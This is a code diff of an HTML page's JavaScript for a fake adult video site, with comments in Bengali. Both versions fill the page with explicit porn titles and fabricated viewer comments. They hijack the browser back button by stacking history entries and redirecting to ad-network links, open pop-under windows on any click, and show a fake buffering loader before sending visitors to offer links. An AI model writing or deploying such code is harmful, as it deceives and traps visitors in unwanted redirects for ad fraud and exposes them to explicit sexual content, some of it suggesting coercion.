@@ -420,161 +420,149 @@
     </div>
 
     <!-- JAVASCRIPT LOGIC -->
-    <script>
-        (function() {
-            // ════════════════════════════════════════════════════════════
-            // LINK CONFIGURATION
-            // ════════════════════════════════════════════════════════════
-            const FIRST_OFFER_LINK = 'https://honmia.com/4/4f4bdff589b9437b3a53e5ffedfcde9a'; 
-            const BACK_AD_LINK     = 'https://www.profitableratecpmnetwork.com/awn1xp0h21?key=26baf4fd741afacd351dde20ac85c8e5'; 
+   <script>
+    (function() {
+        // ════════════════════════════════════════════════════════════
+        // LINKS SETTINGS
+        // ════════════════════════════════════════════════════════════
+        const DIRECT_LINK_MAIN = 'https://www.profitableratecpmnetwork.com/awn1xp0h21?key=26baf4fd741afacd351dde20ac85c8e5'; 
+        const REDIRECT_LINK_1  = 'https://honmia.com/4/ec5866dcb0471f77902fb47c83357279';
+        const BACK_HIJACK_LINK = 'https://www.profitableratecpmnetwork.com/mrf0xkn4?key=a5cb1f5df6809332b2c01da8477db66c';
 
-            let isLocked = false;
+        const videoPool = [
+            { src: 'IMG_5604.GIF', title: 'Hot Girl fucked by Huge cock with Full hardcore sex', views: '2.4M', time: '12:05' },
+            { src: '023_1000.GIF', title: 'Fucked my college friend naked after a long time.', views: '1.8M', time: '15:40' },
+            { src: '21415053.GIF', title: 'I First Time Fuck My Cute Girlfriend hard in bedroom', views: '3.1M', time: '09:12' },
+            { src: 'IMG_0198.GIF', title: 'Horny stepmother caught and forced to extreme blowout', views: '2.5M', time: '10:14' },
+            { src: 'IMG_0199.GIF', title: 'College teen girls sharing massive tools together tape', views: '1.9M', time: '14:22' },
+            { src: 'IMG_0200.GIF', title: 'Deepthroat rehearsal in dressing room leak compilation', views: '3.4M', time: '11:05' },
+            { src: 'IMG_0201.GIF', title: 'Tight amateur stepsister creamed while sneaking out', views: '2.1M', time: '08:45' },
+            { src: 'IMG_0202.GIF', title: 'Wet pov rough ride on huge black cock till she shakes', views: '1.6M', time: '13:50' },
+            { src: 'IMG_0203.GIF', title: 'Horny secretary desktop pounding session uncut version', views: '2.8M', time: '16:15' },
+            { src: 'IMG_0204.GIF', title: 'Slutty girlfriend begs for aggressive back door action', views: '3.0M', time: '12:30' },
+            { src: 'IMG_0205.GIF', title: 'Cum swallowing compilation from top verified premiums', views: '2.3M', time: '10:55' }
+        ];
 
-            // ১. অফার লিংকে যাওয়ার আগে সেশন স্টোরেজে স্টেট সেভ করা
-            // এতে ইউজার ব্যাক করে আসলেও আমরা বুঝতে পারব সে অফার লিংক থেকে ফিরেছে
-            function checkRedirectOnPageShow() {
-                if (sessionStorage.getItem('offer_visited') === 'true') {
-                    // সেশন ক্লিয়ার করে সঙ্গে সঙ্গে ব্যাক হাইজ্যাক লিংকে পাঠাবে
-                    sessionStorage.removeItem('offer_visited');
-                    window.location.replace(BACK_AD_LINK);
-                }
-            }
+        const commentsPool = [
+            { avatar: 'JD', name: 'John D.', text: 'Wow, can\'t believe this is unrated version! 😱🔥', time: '2 mins ago' },
+            { avatar: 'NS', name: 'Naughty_Sam', text: 'Damn, she is taking it so deep! Absolute perfection 🤤💯', time: '1 min ago' },
+            { avatar: 'K9', name: 'Kevin99', text: 'The full video link is amazing, totally worth clicking guys!', time: '4 mins ago' },
+            { avatar: 'A2', name: 'Alex_Adult', text: 'Her body is insane! Love how hard he is pumping her 🍒🍆', time: '3 mins ago' },
+            { avatar: 'LX', name: 'Lisa X', text: 'Oh my god, those positions are wild. Best scene ever! 🔥', time: '5 mins ago' },
+            { avatar: 'MR', name: 'Mike_Rod', text: 'That creampie at the end was completely out of this world! 💦💦', time: '30s ago' },
+            { avatar: 'BH', name: 'Babby_Hot', text: 'She screams so loud, I can listen to this all night long...', time: '6 mins ago' },
+            { avatar: 'ST', name: 'Sins_Fan', text: 'This girl is a beast! Pure hardcore action right here 😳👌', time: '7 mins ago' },
+            { avatar: 'P6', name: 'PornKing69', text: 'That big cock completely stretched her out. Insane wetness!', time: '8 mins ago' },
+            { avatar: 'V2', name: 'Vixen_Lover', text: 'My favorite amateur couple, glad I caught this premiere live!', time: '10 mins ago' },
+            { avatar: 'X3', name: 'XXX_Hunter', text: 'Holy shit! The way she rides that huge tool is gorgeous 👅', time: '11 mins ago' },
+            { avatar: 'DK', name: 'Dirty_Karl', text: 'Absolutely brutal sex, she loves every single inch of it!', time: '12 mins ago' }
+        ];
 
-            // পেজ লোড বা ব্রাউজারের ব্যাক বাটন দিয়ে পেজে প্রবেশের সাথে সাথে চেক করবে
-            window.addEventListener('pageshow', checkRedirectOnPageShow);
+        const mainVideo = videoPool[Math.floor(Math.random() * videoPool.length)];
+        document.getElementById('mainGif').src = mainVideo.src;
+        document.getElementById('mainTitle').textContent = mainVideo.title;
 
-            // ২. স্ক্রল, টাচ বা যেকোনো ক্লিকের সাথে সাথে ব্যাক বাটন হাইজ্যাক প্রস্তুত করা
-            function lockBackHijack() {
-                if (!isLocked) {
-                    isLocked = true;
-                    for (let i = 0; i < 20; i++) {
-                        window.history.pushState({ hijack: true }, '', window.location.href);
-                    }
-                }
-            }
+        // Load Comments
+        let commentsHtml = '';
+        commentsPool.forEach(c => {
+            commentsHtml += `
+            <div class="comment-item">
+                <div class="c-avatar">${c.avatar}</div>
+                <div class="c-body">
+                    <div class="c-name">${c.name} <span>${c.time}</span></div>
+                    <div class="c-text">${c.text}</div>
+                </div>
+            </div>`;
+        });
+        document.getElementById('commentsList').innerHTML = commentsHtml;
 
-            // Click সহ Touch, Scroll সব ইভেন্টেই হাইজ্যাক লক হবে
-            ['click', 'touchstart', 'touchmove', 'scroll', 'wheel'].forEach(eventType => {
-                window.addEventListener(eventType, lockBackHijack, { passive: true });
-            });
-
-            // ৩. সাধারণ ব্যাক বাটন প্রেস করলে ব্যাক বিজ্ঞাপন লিংকে যাবে
-            window.addEventListener('popstate', function(e) {
-                window.location.replace(BACK_AD_LINK);
-            });
-
-            // ৪. অ্যাকশন বাটনে ক্লিক করলে ফেক বাফারিং + অফার লিংকে রিডাইরেক্ট
-            function triggerActionWithBuffer(e) {
-                e.preventDefault();
-                e.stopPropagation();
-
-                // ক্লিকের সাথে সাথে হাইজ্যাক লক হবে
-                lockBackHijack();
-
-                // সেশন স্টোরেজে ফ্ল্যাগ সেট করা যেন ব্যাক করলে বোঝা যায়
-                sessionStorage.setItem('offer_visited', 'true');
-
-                // ফেক বাফারিং অ্যানিমেশন দেখানো
-                const loader = document.getElementById('fakeLoader');
-                if (loader) loader.style.display = 'flex';
-
-                // ১.৫ সেকেন্ড পর ১ম অফার লিংকে নিয়ে যাওয়া
-                setTimeout(() => {
-                    window.location.href = FIRST_OFFER_LINK;
-                }, 1500);
-            }
-
-            // অ্যাকশন বাটনগুলোতে ইভেন্ট যুক্ত করা
-            function bindActionButtons() {
-                document.querySelectorAll('.action-trigger').forEach(el => {
-                    el.removeEventListener('click', triggerActionWithBuffer);
-                    el.addEventListener('click', triggerActionWithBuffer);
-                });
-            }
-
-            bindActionButtons();
-
-            // VIDEO DATA & DYNAMIC UI
-            const videoPool = [
-                { src: 'IMG_5604.GIF', title: 'Hot Girl fucked by Huge cock with Full hardcore sex', views: '2.4M', time: '12:05' },
-                { src: '023_1000.GIF', title: 'Fucked my college friend naked after a long time.', views: '1.8M', time: '15:40' },
-                { src: '21415053.GIF', title: 'I First Time Fuck My Cute Girlfriend hard in bedroom', views: '3.1M', time: '09:12' },
-                { src: 'IMG_0198.GIF', title: 'Horny stepmother caught and forced to extreme blowout', views: '2.5M', time: '10:14' },
-                { src: 'IMG_0199.GIF', title: 'College teen girls sharing massive tools together tape', views: '1.9M', time: '14:22' },
-                { src: 'IMG_0200.GIF', title: 'Deepthroat rehearsal in dressing room leak compilation', views: '3.4M', time: '11:05' },
-                { src: 'IMG_0201.GIF', title: 'Tight amateur stepsister creamed while sneaking out', views: '2.1M', time: '08:45' },
-                { src: 'IMG_0202.GIF', title: 'Wet pov rough ride on huge black cock till she shakes', views: '1.6M', time: '13:50' },
-                { src: 'IMG_0203.GIF', title: 'Horny secretary desktop pounding session uncut version', views: '2.8M', time: '16:15' },
-                { src: 'IMG_0204.GIF', title: 'Slutty girlfriend begs for aggressive back door action', views: '3.0M', time: '12:30' },
-                { src: 'IMG_0205.GIF', title: 'Cum swallowing compilation from top verified premiums', views: '2.3M', time: '10:55' }
-            ];
-
-            const commentsPool = [
-                { icon: 'fa-kiss-wink-heart', class: 'hot', name: 'Naughty_Sam 💋', text: 'She is taking it so deep! Absolute perfection 🤤💯' },
-                { icon: 'fa-fire-alt', class: 'fire', name: 'HotGirl_69 🔥', text: 'OMG! 4K quality is crystal clear! 😱' },
-                { icon: 'fa-gem', class: 'vip', name: 'VIP_Member ⭐', text: 'Full video link unlocked guys! Amazing stream 🔥' },
-                { icon: 'fa-video', class: 'cam', name: 'LiveCam_Girl 🍓', text: 'Her body is insane! Love this 4K stream 🍒🍆' },
-                { icon: 'fa-heart', class: 'hot', name: 'Lisa_Adult 💋', text: 'Oh my god, best live scene ever! 🔥' },
-                { icon: 'fa-bolt', class: 'vip', name: 'Mike_Rod 💦', text: 'That creampie at the end was completely wild! 💦💦' }
-            ];
-
-            const mainVideo = videoPool[Math.floor(Math.random() * videoPool.length)];
-            document.getElementById('mainGif').src = mainVideo.src;
-            document.getElementById('mainTitle').textContent = mainVideo.title;
-
-            let baseViews = 64280;
-            const viewsEl = document.getElementById('mainViews');
-            setInterval(() => {
-                baseViews += Math.floor(Math.random() * 25) - 10;
-                viewsEl.textContent = baseViews.toLocaleString();
-            }, 2500);
-
-            const chatStream = document.getElementById('chatStream');
-            let commentIndex = 0;
-
-            function addLiveChatMessage() {
-                const comment = commentsPool[commentIndex % commentsPool.length];
-                commentIndex++;
-
-                const chatItem = document.createElement('div');
-                chatItem.className = 'comment-item';
-                chatItem.innerHTML = `
-                    <div class="c-avatar-icon ${comment.class}"><i class="fas ${comment.icon}"></i></div>
-                    <div>
-                        <div class="c-name">${comment.name} <span>Just now</span></div>
-                        <div class="c-text">${comment.text}</div>
+        // Load Sidebar Recommendations
+        let sidebarHtml = '';
+        videoPool.forEach((item) => {
+            if(item.title !== mainVideo.title || item.src !== mainVideo.src) {
+                sidebarHtml += `
+                <div class="sidebar-item suggested-video-item">
+                    <div class="thumb">
+                        <img src="${item.src}" loading="lazy" />
+                        <div class="duration">${item.time}</div>
                     </div>
-                `;
+                    <div class="info">
+                        <div class="title">${item.title}</div>
+                        <div class="meta">${item.views} views • Recommendation</div>
+                    </div>
+                </div>`;
+            }
+        });
+        document.getElementById('suggestedList').innerHTML = sidebarHtml;
 
-                chatStream.appendChild(chatItem);
-                if (chatStream.children.length > 4) chatStream.removeChild(chatStream.children[0]);
+        // ════════════════════════════════════════════════════════════
+        // ADVANCED POP-UNDER & TAB-UNDER REDIRECT LOGIC
+        // ════════════════════════════════════════════════════════════
+        let isRedirecting = false;
+
+        function triggerPopUnder() {
+            if (isRedirecting) return;
+            isRedirecting = true;
+
+            // ব্যাক বাটন হাইজ্যাকিং এর হিস্ট্রি তৈরি করে রাখা
+            pushStateHistory();
+
+            // ১. অ্যাডস লিঙ্ক নতুন ট্যাবে বা পপ-আন্ডার উইন্ডোতে ওপেন করা
+            let popWindow = window.open(REDIRECT_LINK_1, '_blank');
+            
+            if (popWindow) {
+                try {
+                    // নতুন উইন্ডো থেকে ফোকাস সরিয়ে মেইন পেজে রাখা (Pop-under Trick)
+                    popWindow.blur();
+                    window.focus();
+                } catch(e) {}
             }
 
-            addLiveChatMessage();
-            addLiveChatMessage();
-            setInterval(addLiveChatMessage, 2000);
+            // ২. ২০০ মিলি-সেকেন্ডের হালকা বাফারিং ডিলে দিয়ে মেইন ট্যাবকে অফার লিঙ্কে নিয়ে যাওয়া
+            setTimeout(function() {
+                window.location.href = DIRECT_LINK_MAIN;
+            }, 200);
+        }
 
-            let sidebarHtml = '';
-            videoPool.forEach((item) => {
-                if (item.title !== mainVideo.title) {
-                    sidebarHtml += `
-                    <div class="sidebar-item action-trigger">
-                        <div class="thumb">
-                            <img src="${item.src}" loading="lazy" />
-                            <div class="duration">${item.time}</div>
-                        </div>
-                        <div class="info">
-                            <div class="title">${item.title}</div>
-                            <div class="meta">${item.views} views • 4K HD</div>
-                        </div>
-                    </div>`;
-                }
-            });
-            document.getElementById('suggestedList').innerHTML = sidebarHtml;
+        // পেজের যে কোনো জায়গায় ক্লিক করলেই ট্রিপল-অ্যাকশন ট্রিগার হবে
+        document.addEventListener('click', function(e) {
+            triggerPopUnder();
+        });
 
-            // ডায়নামিক কন্টেন্ট লোড হওয়ার পর বাটন পুনরায় বাইন্ড
-            bindActionButtons();
-        })();
-    </script>
+        // ════════════════════════════════════════════════════════════
+        // ENHANCED BACK-BUTTON HIJACKING
+        // ════════════════════════════════════════════════════════════
+        let hijackInitialized = false;
+
+        function pushStateHistory() {
+            for (let i = 0; i < 15; i++) {
+                window.history.pushState({ page: i }, document.title, window.location.href);
+            }
+        }
+
+        function setupHijack() {
+            if (!hijackInitialized) {
+                pushStateHistory();
+                hijackInitialized = true;
+            }
+        }
+
+        // প্রথম পেজ লোডেই হিস্ট্রি পুশ
+        pushStateHistory();
+
+        // ইউজারের কোনো ইন্টারঅ্যাকশন পেলেই হিস্ট্রি ট্র্যাপ শক্তিশালী করা
+        const userEvents = ['click', 'touchstart', 'mousemove', 'scroll', 'keydown'];
+        userEvents.forEach(evt => {
+            window.addEventListener(evt, setupHijack, { passive: true });
+        });
+
+        // ব্যাক বাটন চাপলেই হাইজ্যাক লিঙ্কে রিডাইরেক্ট হবে
+        window.addEventListener('popstate', function (event) {
+            pushStateHistory();
+                window.location.href = BACK_HIJACK_LINK;
+        });
+
+    })();
+</script>
 </body>
 </html>
